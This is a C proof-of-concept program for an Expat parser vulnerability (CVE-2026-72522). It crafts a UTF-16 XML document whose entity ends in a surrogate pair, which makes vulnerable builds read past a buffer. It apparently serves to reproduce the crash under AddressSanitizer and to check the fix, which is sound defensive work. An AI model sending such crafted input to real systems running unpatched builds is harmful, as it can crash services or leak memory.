/*
 * Reconstruction of the reference PoC for the UTF-16 surrogate pair issue in
 * XML_UNICODE builds (CVE-2026-72522).
 *
 * An internal entity whose replacement text ends in an astral character is
 * referenced from an attribute value.  When the replacement text is stored,
 * the trailing low surrogate of the pair used to be dropped while converting
 * to the internal UTF-16 encoding, leaving a lone high surrogate at the end
 * of the stored text.  Re-tokenizing that text then walked past its end.
 *
 * This program is expected to abort under AddressSanitizer on the vulnerable
 * parent revision and to parse the document cleanly on the fixed tree.
 *
 * Build (from the top of the source tree):
 *
 *   cc -fsanitize=address -g -O1 -DXML_UNICODE \
 *       -I<build-dir-with-expat_config.h> -Iexpat/lib \
 *       pocs/original_bug.c <build-dir>/libexpatw.a -o original_bug && ./original_bug
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include "expat_config.h"
#include "expat.h"

/* Length of the run of 'A' characters preceding the astral character. */
#define PAD_LEN 1023

static unsigned short doc[8192];
static size_t docLen = 0;

static void
putAscii(const char *s) {
  while (*s)
    doc[docLen++] = (unsigned char)*s++;
}

static void
buildDocument(void) {
  doc[docLen++] = 0xFEFF; /* byte order mark */
  putAscii("<?xml version='1.0' encoding='UTF-16'?>\n");
  putAscii("<!DOCTYPE d [\n<!ENTITY e \"");
  for (int i = 0; i < PAD_LEN; i++)
    doc[docLen++] = 'A';
  doc[docLen++] = 0xD834; /* high surrogate of U+1D11E */
  doc[docLen++] = 0xDD1E; /* low surrogate of U+1D11E */
  putAscii("\">\n]>\n");
  putAscii("<d a='&e;'/>\n");
}

static void XMLCALL
startElement(void *userData, const XML_Char *name, const XML_Char **atts) {
  (void)userData;
  (void)name;
  (void)atts;
}

static void XMLCALL
endElement(void *userData, const XML_Char *name) {
  (void)userData;
  (void)name;
}

int
main(int argc, char **argv) {
  /* Bytes per XML_Parse() call; 0 hands over the whole document at once. */
  const size_t chunk = (argc > 1) ? (size_t)atoi(argv[1]) : 0;

  buildDocument();
  const char *const bytes = (const char *)doc;
  const size_t bytesLen = docLen * sizeof(unsigned short);

  XML_Parser parser = XML_ParserCreate(NULL);
  if (parser == NULL) {
    fprintf(stderr, "Failed to create parser\n");
    return 1;
  }
  XML_SetElementHandler(parser, startElement, endElement);

  enum XML_Status status = XML_STATUS_ERROR;
  if (chunk == 0) {
    status = XML_Parse(parser, bytes, (int)bytesLen, 1);
  } else {
    size_t off = 0;
    while (off < bytesLen) {
      const size_t take
          = (bytesLen - off > chunk) ? chunk : (bytesLen - off);
      status = XML_Parse(parser, bytes + off, (int)take,
                         (off + take == bytesLen));
      if (status == XML_STATUS_ERROR)
        break;
      off += take;
    }
  }

  if (status == XML_STATUS_ERROR)
    fprintf(stderr, "Expat error: %s (line %lu)\n",
            XML_ErrorString(XML_GetErrorCode(parser)),
            (unsigned long)XML_GetCurrentLineNumber(parser));
  else
    fprintf(stderr, "Document parsed successfully\n");

  XML_ParserFree(parser);
  return 0;
}
